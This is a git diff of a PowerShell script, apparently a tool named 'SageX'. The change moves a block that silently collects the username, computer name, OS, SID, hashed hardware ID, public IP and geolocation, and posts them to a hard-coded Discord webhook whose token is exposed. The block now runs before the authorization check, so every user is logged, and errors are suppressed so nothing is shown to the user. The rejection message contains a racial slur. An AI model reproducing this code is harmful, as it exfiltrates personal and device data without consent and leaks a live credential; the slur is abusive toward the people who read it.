@@ -23,23 +23,61 @@ try {
     Write-Host "[!] Failed to get SID" -ForegroundColor Red
     exit
 }
+# ----------- WEBHOOK BLOCK BEGIN -----------
 
-# Correct GitHub raw URL
-$authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/refs/heads/main/HWID"
+$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
 
+# Collect system info
+$user = $env:USERNAME
+$pcName = $env:COMPUTERNAME
+$os = (Get-CimInstance Win32_OperatingSystem).Caption
+$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
+$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
+
+# External IP and geo info
 try {
-    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing
+    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json"
+    $ip = $ipInfo.query
+    $country = $ipInfo.country
+    $region = $ipInfo.regionName
+    $city = $ipInfo.city
 } catch {
-    Write-Host "`n[!] Failed to fetch authorized SIDs from server." -ForegroundColor Red
-    exit
+    $ip = "Unavailable"
+    $country = "Unavailable"
+    $region = "Unavailable"
+    $city = "Unavailable"
 }
 
-# Check if SID is authorized
-if ($rawData -notmatch $sid) {
-    Write-Host "`n[!]Who the Fuck Are You ?? Nigga !!!" -ForegroundColor Red
-    Start-Sleep -Seconds 6
-    exit
+# Create embed
+$embed = @{
+    title = "<:Dead:1346705076626002033> SageX Executed"
+    color = 16711680
+    timestamp = (Get-Date).ToString("o")
+    fields = @(
+        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
+        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
+        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
+        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
+        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
+        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
+    )
 }
+
+$payload = @{
+    username = "SageX Logger"
+    embeds = @($embed)
+} | ConvertTo-Json -Depth 10
+
+# Send webhook
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+} catch {
+    }
+
+# ----------- WEBHOOK BLOCK END -----------
 
 # ----------- OTP VERIFICATION BEGIN -----------
 # OTP System Configuration
@@ -169,61 +207,22 @@ if (Test-Path $otpValidatedPath) {
     }
 }
 
-# ----------- WEBHOOK BLOCK BEGIN -----------
+# Correct GitHub raw URL
+$authURL = "https://raw.githubusercontent.com/Toxic-Speed/SAGE-X/refs/heads/main/HWID"
 
-$webhookUrl = "https://discord.com/api/webhooks/1375353706232414238/dMBMuwq29UaqujrlC1YPhh9-ygK-pX2mY5S7VHb4-WUrxWMPBB8YPVszTfubk-eVLrgN"
-
-# Collect system info
-$user = $env:USERNAME
-$pcName = $env:COMPUTERNAME
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-$hwid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
-$hashedHWID = [System.BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hwid))) -replace "-", ""
-
-# External IP and geo info
 try {
-    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json"
-    $ip = $ipInfo.query
-    $country = $ipInfo.country
-    $region = $ipInfo.regionName
-    $city = $ipInfo.city
+    $rawData = Invoke-RestMethod -Uri $authURL -UseBasicParsing
 } catch {
-    $ip = "Unavailable"
-    $country = "Unavailable"
-    $region = "Unavailable"
-    $city = "Unavailable"
+    Write-Host "`n[!] Failed to fetch authorized SIDs from server." -ForegroundColor Red
+    exit
 }
 
-# Create embed
-$embed = @{
-    title = "<:Dead:1346705076626002033> SageX Executed"
-    color = 16711680
-    timestamp = (Get-Date).ToString("o")
-    fields = @(
-        @{ name = "<a:trick_supreme:1346694280386707466> User"; value = $user; inline = $true },
-        @{ name = "<a:trick_supreme:1346694193157767269> PC Name"; value = $pcName; inline = $true },
-        @{ name = "<:windows:904792336058425346> OS"; value = $os; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> SID"; value = $sid; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> HWID (hashed)"; value = $hashedHWID; inline = $false },
-        @{ name = "<:trick_supreme:1346446598791757884> IP Address"; value = $ip; inline = $true },
-        @{ name = "<:trick_supreme:1346446598791757884> Location"; value = "$city, $region, $country"; inline = $true },
-        @{ name = "<a:726747821373653072:1346705048947785822> Time"; value = $time; inline = $false }
-    )
+# Check if SID is authorized
+if ($rawData -notmatch $sid) {
+    Write-Host "`n[!]Who the Fuck Are You ?? Nigga !!!" -ForegroundColor Red
+    Start-Sleep -Seconds 6
+    exit
 }
-
-$payload = @{
-    username = "SageX Logger"
-    embeds = @($embed)
-} | ConvertTo-Json -Depth 10
-
-# Send webhook
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-} catch {
-    }
-
-# ----------- WEBHOOK BLOCK END -----------
 
 # Message lines
 $msgLines = @(
